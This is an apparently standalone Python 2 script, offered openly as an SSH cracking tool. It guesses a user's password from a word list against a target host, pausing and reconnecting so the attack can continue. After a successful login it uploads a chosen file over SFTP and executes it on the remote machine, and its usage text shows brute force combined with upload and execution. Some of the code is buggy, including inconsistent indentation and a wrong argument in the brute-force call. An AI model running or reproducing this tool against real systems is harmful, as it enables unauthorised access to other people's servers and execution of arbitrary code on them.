# Athor: Abdel Sako
# Profesion: Linux Engineer

#!/usr/bin/env python
from paramiko import SSHClient, Channel, SFTPClient, AutoAddPolicy, SSHException, AuthenticationException, transport
from optparse import OptionParser
from sys import exit
from os import stat, error, listdir
os_error = error
from socket import error, socket
socket_error = error
from time import sleep
from linecache import getline, clearcache

parser = OptionParser()
parser.add_option("-u", "--user", type="string", dest="user_name", help="User name to brute force")
parser.add_option("-i", "--inet", type="string", dest="ip_address", help="Host name or inet v4 address to attack")
parser.add_option("-L", "--list", type="string", dest="passwd_list", help="Your password list")
parser.add_option("-p", "--passwd", type="string", dest="password", help="Specific password to login with (the -L option  and its arg should be omitted )")
parser.add_option("-l", "--local", type="string", dest="local_file", help="The file to upload and execute, a .sh or .py file")
parser.add_option("-r", "--remote", type="string", dest="remote_dir", help="Directory on the remote host where to upload and execute your code")
parser.add_option("-f", "--files", type="string", dest="files", help="List of extra files you want to upload, but won't be automaticly executed")
parser.add_option("-c", "--cmd", type="string", dest="command", help="Specific command to execute your code with if the file is neither a shell or python script ")
parser.add_option("-P", "--port", type="int", dest="port", help="Specific SSH server port, DEFAULT = 22")
parser.add_option("-s", "--sleep", type="int", dest="Secs", help="Time in second(s) to sleep if the SSH server is not responding, Default is 10s")
parser.add_option("-w", "--wait", type="int", dest="secs", help="Amount of time between each attempt, default is 0s" )
parser.add_option("-a", "--attempt", type="int", dest="num", help="Sleep after \"NUM\" attempt. Default is 0s and sleep time default is 10s")
(options, args) = parser.parse_args()

files = options.files
END = "\n[+] EXITING THE PROGRAM"

class ssh_cracker:
        user = options.user_name
        host = options.ip_address
	dict = options.passwd_list
	local = options.local_file
	remote = options.remote_dir
	passwd = options.password
	command = options.command
	port = options.port
	S = options.Secs
	s = options.secs
	attempt = options.num
	sftp = ''
	def ssh_brute_force(self, USER, HOST, PORT, DICT, n):
		def spec_passwd(PORT): 			# FUNCTION THAT LOGS IN WITH A SPECIFIC PASSWORD
			try:
				ssh.connect(HOST, PORT, username=USER, password=sw.passwd)
				return sw.passwd
			except (SSHException, socket_error):
				print "[-] INVALID PASSWORD: %s"%sw.passwd
				print END
				exit(0)
		def passwd_list(PORT):			# FUNCTION THAT LUNCHES THE BRUTE FORCE ATTACK
			while 1:
				line = getline(sw.dict, n)
				password = line.split('\n')[0]
				try:
					print "[+] TRYING TO GUESS THE PASSWORD, ATTACKING HOST:",sw.host,":",sw.port," ==> #:",n," || USERNAME: %s <:> PASSWORD: %s"%(sw.user, password)
					print "[+] WAIT TIME BETWEEN EACH ATTEMPT: ",sw.s,"s"
					sleep(sw.s)
					ssh.connect(HOST, PORT, username=USER, password=password)
					clearcache()
					return password
					break

				except (AuthenticationException, socket_error, transport):
					print "[-] FAILED ... "
					clearcache()
					ssh.close()
					return n
					continue
				else:
					return password

		if sw.passwd and sw.dict != None:
			print '[-] "INVALID OPTION CONBINATION, -d" or "--dict" and "-p" or "--passwd" OPTIONS CAN\'T WORK TOGETHER'
			print END
			exit(0)
		elif sw.passwd != None:
			print "\n[+] LOGIN INTO HOST WITH A SPECIFIC PASSWORD: %s" %(sw.passwd)
			if sw.port == None:
				sw.port = 22
				retr = spec_passwd(sw.port)
			elif sw.port != None:
				retr = spec_passwd(sw.port)
		elif sw.dict != None:
			if sw.port == None:
				sw.port = 22
				retr = passwd_list(sw.port)
			elif sw.port != None:
				retr = passwd_list(sw.port)
		return retr

	def file_upload(self, LOCAL_PATH, REMOTE_PATH):		# FUNCTION THAT UPLOADS THE FILE TO BE EXECUTED 
		try:
			if REMOTE_PATH[-1] != '/':
				REMOTE_PATH = REMOTE_PATH+'/'
			try:
				sw.sftp.stat(REMOTE_PATH)
			except (IOError, SSHException) as e:
				if '[Errno 13]' in str(e):
					print "[-] SFTP: PERMISSION DENIED: COULDN\'T ACCESS \"%s\" ON THE REMOTE HOST \"%s\""%(REMOTE_PATH, sw.host)
					print END
					exit(0)
				elif '[Errno 2]':
					print "[-] SFPT: NO SUCH DIRECTORY \"%s\" IN THE REMOTE HOST \"%s\" FILESYSTEM"%(REMOTE_PATH, sw.host)
					print END
					exit(0)
				else:
					print "[-] SFTP ERROR: FAILED TO UPLOAD \"%s\""%(sw.local)
					print END
					exit(0)
			REMOTE_FILE = REMOTE_PATH+LOCAL_PATH.split('/')[-1]
			sw.sftp.put(LOCAL_PATH, REMOTE_FILE)
		except (IOError, SSHException) as e:
			if '[Errno 13]' in str(e):
				print "\n[-] SFTP: PERMISSION DENIED: COULDN'T ACCESS \"%s\" ON THE REMOTE HOST \"%s\""%(sw.remote, sw.host)
				print "[-] SFTP: FAILED TO UPLOAD"
				print END
				exit(0)
			else:
				print "\n[-] SFTP ERROR: FAILED TO UPLOAD %s"%(sw.local)
				print END
				del e
				exit(0)
		return  REMOTE_FILE

	def exe_file(self, cmd, ext):				# FUNCTION THAT EXECUTES THE UPLOADED FILE
		ch = ssh.get_transport().open_session()
		try:
			if ext == 'sh':
				cmd = 'sh'
				if sw.command != None:
					cmd = sw.command
				print "[+] EXECUTING %s ON THE REMOTE HOST..."%(sw.local)
				ch.exec_command(cmd+" "+file)
				print '[+] THE COMMAND "'+cmd+' '+file+'" WAS EXECUTED'
			elif ext == 'py':
				cmd = 'python'
				if sw.command != None:
					cmd = sw.command
				print "[+] EXECUTING %s ON THE REMOTE HOST..."%(sw.local)
				ch.exec_command(cmd+" "+file)
				print '[+] THE COMMAND"'+cmd+' '+file+'" WAS EXECUTED'
			elif ext != 'sh' and ext != 'py':
				cmd = sw.command
				print "[+] EXECUTING %s ON THE REMOTE HOST..."%(sw.local)
				ch.exec_command(cmd+" "+file)
				print '[+] THE COMMAND "'+cmd+' '+file+'" WAS EXECUTED'
		except SSHException:
			print "[-] SSH: %s COMMAND EXECUTION FAILED"+sw.command
			ch.close()
			print END
			exit(0)
		else:
			data = ch.recv(2048), ch.recv_stderr(1024)
			ch.close()
			return data

def upload_files():			# FUNCTION THAT UPLOADS ADDITIONAL FILES
	for f in fichier:
		try:
			if sw.remote[-1] != '/':
				sw.remote = sw.remote+'/'
			try:
				r = sw.sftp.listdir(sw.remote)
			except (IOError, SSHException) as e:
				if '[Errno 13]' in str(e):
					print "[-] SFTP: PERMISSION DENIED: COULDN\'T ACCESS \"%s\" ON THE REMOTE HOST \"%s\""%(sw.remote, sw.host)
					print END
					exit(0)
				elif '[Errno 2]' in str(e):
					print "[-] NO SUCH DIRECTORY: \"%s\", IN THE REMOTE HOST \"%s\" FILE SYSTEM"%(sw.remote, sw.host)
					print END
					exit(0)
				del e
				print "[-] \"%s\" DOES NOT EXIST ON \"%s\" or YOU DO NOT HAVE PRIVILEGES TO ACCESS IT"%(sw.remote, sw.host)
				print "[-] FAILED TO UPLOAD: \"%s\" to \"%s/%s\""%(files, sw.local,sw.remote)
				print END
				exit(0)
			print "[+] UPLOADING \"%s\" TO \"%s\" ON THE REMOTE \"%s\""%(f, sw.remote, sw.host)
			sw.sftp.put(f, sw.remote+f.split('/')[-1])
			print "[+] \"%s\" WAS SUCCESSFULLY UPLOADED TO \"%s\""%(f, sw.host)
		except (IOError, SSHException) as e:
			if '[Errno 13]' in str(e):
				print "[-] SFTP: PERMISSION DENIED: COULDN\'T ACCESS \"%s\" ON THE REMOTE HOST \"%s\""%(sw.remote, sw.host)
				print END
				exit(0)
			else:
				print "[-] SFTP ERROR: FAILED TO UPLOAD."
				print END
				exit(0)

def test_host_route(slp):		# FUNCTION THAT TEST IF THE REMOTE HOST IS ACTIVE AND ALLOWING TRAFFIC TO THE SSH SERVER
	while 1:
		print "[+] SLEEPING FOR ",slp,"s AND WILL TRY TO CONNECT BACK" 
		sleep(slp)
		sock_verif2 = socket()
		try:
			sock_verif2.connect((sw.host, sw.port))
			sock_verif2.close()
			del sock_verif2
			break
		except socket_error:
			sock_verif2.close()
			print "[-] NO ROUTE FOUND TO ",sw.host,":",sw.port
			del sock_verif2
def handle_file(FILE):
	try:
		d = listdir(FILE)
		del d
		print "[-] NO SUCH FILE: \"%s\""%FILE
		print END
		exit(0)
	except (os_error, IOError) as e:
		if '[Errno 2]' in str(e):
			print "[-] NO SUCH FILE: \"%s\""%(FILE)
			print END
			exit(0)
		elif '[Errno 13]' in str(e):
			print "[-] PERMISSION DENIED: COULDN\'T ACCESS \"%s\""%(FILE)
			print END
			exit(0)
	try:
		stat(FILE)
	except (IOError, os_error) as e:
		if '[Errno 13' in str(e):
			print "SYSTEM: PERMISSION DENIED: COULDN\'T ACCESS \"%s\""%(FILE)
			print END
			exit(0)
		else:
			print "[-] NO SUCH FILE"
			print END
			exit(0)

def sftp_open():
	try:                                                             # DEFINING THE "sftp" variable and OPENING SFTP A CONNECTION TO THE REMOTE SERVER
		sw.sftp = ssh.open_sftp()
		return sw.sftp
	except SSHException:                                             # THE SCRIPT WILL EXIT IF IT FAILS TO OPEN AN SFTP CONNECTION AFTER OBTAINING A
		print "\n[-] FAILED TO OPEN AN SFTP CONNECTION"		 # VALID PASSWORD DURING THE BRUTE FORCE
		print "[-] ACCESS DENIED"
		print END
		exit(0)
				
if __name__ == "__main__" :

	sw = ssh_cracker()
	tries = 0
	if sw.host == None and sw.port == sw.user and sw.S == sw.s and sw.command == sw.local and sw.remote == files and sw.passwd == sw.dict:
		print "Usage: "
		print "\tBrute Force: \t\t\tpython ",__file__," -i 1.2.3.4 -u username -L password_list.txt"
		print "\t\t\t\t\tpython ",__file__," -i 1.2.3.4 -u username -L password_list.txt -a 5 -s 5\n"
		print "\tBrute force, Upload & Exe: \tpython ",__file__," -i 1.2.3.4 -u username -L password_list.txt -l local_file.sh -r remote_directory"
		print "\t\t\t\t\tpython ",__file__," -i 1.2.3.4 -u username -L password_list.txt -l local_file.sh -r remote_directory -f \"file1,file2,file3\"\n"
		print "\tFile transfert:"
		print "\t\t\t\t\tpython ",__file__," -i 1.2.3.4 -u username -p \"password\" -f \"file1,file2,file3\" -r remote_directory\n"
		print "\tTest login:"
		print "\t\t\t\t\tpython ",__file__," -i 1.2.3.4 -u username -p \"password\""
		print END
		exit(0)
	elif sw.user == None:
		print "HELP:\n\t\tshell> python ",__file__,"\n\t\tshell> python ",__file__," -h"
		print END
		exit(0)
	elif sw.dict == None:
		if sw.passwd == None:
			print "HELP:\n\t\tshell> python ",__file__,"\n\t\tshell> python ",__file__," -h"
			print END
			exit(0)
	elif sw.host == None:
		print "HELP:\n\t\tshell> python ",__file__,"\n\t\tshell> python ",__file__," -h"
		print END
		exit(0)
	else:
		pass

	if sw.S != None:
		if sw.S < 0:
        	        print "\n[-] THE TIME TO SLEEP AFTER A DISCONNECTION MUST BE AN INTEGER SUPERIOR OR EQUAL TO \"0\""
        	        print END
               	 	exit(0)
	if sw.remote != None:
		if files == None:
			if sw.local == None:
				print "[-] INVALID OPTION CONBINAISON: YOU MUST SPECIFY A FILE OR FILES TO UPLOAD WITH THE \"-l\" OR \"-f\" "
				print END
				exit(0)
	if sw.local != None:
		handle_file(sw.local)
	n = 1

	if sw.host == None:
		print "[-] YOU MUST SPECIFY AN IP ADDRESS WITH THE \"-i\" OR \"--inet\" OPTION "
		print END
		exit(0)
	if sw.port == None:
		sw.port = 22
	s = socket()
	try:
		if sw.port <= 0:
			print "[-] THE PORT NUMBER MUST BE AN INTERGER SUPERIOR TO 0"
			print END
			exit(0)
		s.connect((sw.host, sw.port))
	except (socket_error,  KeyboardInterrupt):
		print "[-] HOST NOT FOUND: ",sw.host,":",sw.port
		print "[-] VERIFY IF ",sw.host,"IS ACTIVE, AND MAKE SURE AN SSH SERVER IS RUNNING AND ALLOWING TRAFFIC ON PORT ",sw.port
		print END
		exit(0)

	ssh = SSHClient()
	ssh.set_missing_host_key_policy(AutoAddPolicy())

	if files != None and sw.remote == None:
		print "\n[-] YOU MUST SPECIFY A REMOTE DIRECTORY WHERE TO UPLOAD YOUR FILES USING THE \"-r\" OR \"--remote\" OPTION"
		print END
		exit(0)
	if sw.local != None:
		try:
			stat(sw.local)
			if sw.remote == None:
				print "[-] SPECIFY A DIRECTORY WHERE TO UPLOAD AND EXECUTE %s USING THE \"-r\" OR \"--remote\" OPTION"%(sw.local)
				print END
				exit(0)
		except os_error:
			print "\n[-] %s: NO SUCH!!!"%(sw.local)
			print "[-] VERIFY YOUR LOCAL PATH AND FILE NAME\n"
			exit(0)
		else:
			fichier_local = sw.local
			if fichier_local.split('.')[-1] != 'sh' and fichier_local.split('.')[-1] != 'py':
				if sw.command == None:
					print "\n[-] THE FILE YOU CHOSE TO UPLOAD AND EXECUTE IS NEITHER A \"shell\" NOR A \"python\" SCRIPT."
					print "[-] YOU MUST SPECIFY THE EXECUTION COMMAND WITH THE \"-c\" or \"--command\" option "
					print "[+] EXAMPLE: python ",__file__," -i 127.0.0.1 -u root -L passwd.txt -l java.jar -r /tmp -c \"java -jar\""
					print END
					exit(0)
	elif sw.command != None:
		if sw.local == None:
			print "\n[-] INVALID OPTION CONBINATION: \"-c\" or \"--cmd\" MUST BE COMBINED WITH THE \"-l\" OR \"--local\" AND \"-r\" OR \"--remote\" OPTIONS"
			print END
			exit(0)
		elif sw.remote == None:
			print "\n[-] YOU MUST SPECIFY A DIRECTORY WHERE TO UPLOAD AND EXECUTE %s WITH THE \"-r\" OR \"--remote\" OPTION"%(sw.local)
			print END
			exit(0)

	if files != None:
		if files[0] == ' ':
			print "\n[-] ARGUMENT ERROR: A SPACE WAS DETECTED AFTER THE FIRST QUOTATION MARK AT THE BEGINNING OF THE ARGUMENT"
			print "[+] EXAMPLE: python ",__file__," -i 127.0.0.1 -u root -L passwd.txt -l java.jar -r /tmp -c \"java -jar\" -f \"file1,file2,file3\""
			print END
			exit(0)
		elif files[-1] == ' ':
			print "[-] ARGUMENT ERROR: A SPACE WAS DETECTED BEFORE THE QUOTATION MARK AT THE END OF THE ARGUMENT"
			print END
			exit(0)
		else:
        		fichier = files.split(',')
	        	for f in fichier:
				handle_file(f)
                		if f[0] == ' ':
                        		print "[-] ERROR: A SPACE WAS DETECTED BETWEEN "+f+" AND THE PRECEDING COMMA"
					print END
					exit(0)
	        	        elif f[-1] == ' ':
        	        	        print "[-] ERROR: A SPACE WAS DETECTED BETWEEN "+f+" AND THE FOLLOWING COMMA"
					print END
					exit(0)
		for f in fichier:
			try:
				if stat(f):
					pass
			except os_error:
				print "[-] "+f+": NO SUCH FILE"
				print "[-] CHECK THE YOUR FILE(S) NAME(S) AND ITS/THEIR PATH(S)"
				print END
				exit(0)
	else:
		pass

	if sw.dict != None:
		try:
			f = open(sw.dict, 'r')
			m = len(f.readlines())
			f.close()
		except IOError:
			print "[-] CHECK YOUR PASSWORD LIST FILE NAME AND ITS PATH: %s"%(sw.dict)
			print END
			exit(0)
	if sw.s == None:
		sw.s = 0

	while 1:		# BEGIN: ################## HERE IS WHERE THE BRUTE FORCE BEGINS #####################################
		try:
			sock_verif = socket()
			sock_verif.connect((sw.host, sw.port))
			rtrn = sw.ssh_brute_force(sw.user, sw.host, sw.port, sw.passwd, n) #FUNCTION CALL THAT LUNCHES THE BRUTE FORCE ATTACK
			if rtrn != n:
                        	break
			elif sw.attempt != None:
				sw.attempt -= 1
				tries += 1
				if sw.attempt == 0:
					sw.attempt = tries
					tries = 0
					if sw.S == None:
						print "[+] SLEEPING FOR 10s AND WILL CONTINUE THE BRUTE FORCE..."
						sleep(10)
					elif sw.S != None:
						print "[+] SLEEPING FOR ",sw.S,"s AND WILL CONTINUE THE BRUTE FORCE..."
						sleep(sw.S)

			elif n == m:
				print "[-] PASSWORD NOT FOUND, TRY ANOTHER PASSWORD LIST"
				print END
				exit(0)
			n += 1

			sock_verif.close()
			del sock_verif
		except (socket_error, SSHException, AuthenticationException, KeyboardInterrupt):
			sock_verif.close()
			del sock_verif
			print "\n[-] BRUTE FORCE INTERRUPTED BY KEYBOARD INPUT OR CONNECTION WAS REFUSED BY THE REMOTE HOST"
			print "\n[+] SLEEPING!!!\n.................................................................................."
			print "    	\n\t\t STRIKE \"^C\" TO EXIT THE SCRIPT\n"
			print ".................................................................................."
			try:
				if sw.S == None:
					test_host_route(10)
				elif sw.S != None:
					test_host_route(sw.S)
			except KeyboardInterrupt:
				print END
				exit(0)			######################## END ###################################
	print "\n[+] SUCCESS!!! THESE CREDENTIALS ARE VALID >>>>>>>> USERNAME: %s || PASSWORD: %s \n" %(sw.user, rtrn)

	if sw.remote != None and sw.local != None:
		c = sftp_open()
		print "[+] UPLOADING \"%s\" TO \"%s\" ON THE REMOTE HOST \"%s\""%(sw.local, sw.remote, sw.host)
		file = sw.file_upload(sw.local, sw.remote) #THIS FUNCTION CALL UPLOADS THE EXECUTABLE FILE
		print "[+] SUCESSFULLY UPLOADED \"%s\" TO \"%s\""%(sw.local, sw.host)
		c.close()

	if files != None and sw.remote != None: 		# THIS VARIABLE IS THE "files" VARIABLE NOT "file", DON'T CONFUSE THEM
			c = sftp_open()
			upload_files()		# FUNCTION CALL THAT UPLOADS ALL THE ADDITIONNAL FILES

			c.close() 		# CLOSING THE SFTP CONNECTION

	if sw.local != None and sw.remote != None:
		y = file.split('/')[-1]
		x = y.split('.')[-1] 	# "x" CONTAINS THE FILE EXTENTION VALUE 

		if x == 'sh' or x == 'py':					############ BEGIN: EXECUTION OF THE UPLOADED FILE ##############
			val_rtrn = sw.exe_file('', x) 				# 	FIRST VERIFIES IF IT'S A SHELL OR PYTHON SCRIPT,
		elif x != 'sh' or x != 'py':					#	AND WILL AUTOMATICALLY EXECUTE THE FILE.
			if sw.command != None:					#	BUT IF THE FILE EXTENTION IS DIFFERENT FROM THE ONES
				val_rtrn = sw.exe_file(sw.command, '') 		#	ABOVE, THEN THE USER WILL HAVE TO PARSE
		if val_rtrn [0] != '':						#	THE "-c" OR "--cmd" OPTION
			print "\n[+] ",val_rtrn[0]

		if val_rtrn[1] == '':
			print "[+] SUCCESSFULLY EXECUTED"
		elif val_rtrn[1] != '':
			print "[-] BUT SOMETHING WENT WRONG"
			print "[-] HERE IS THE VALUE OF THE \"stderr\" RETURNED: "
			print "\n[-] "+val_rtrn[1]				############################ END: #############################

	ssh.close()
	s.close()
	exit(0)
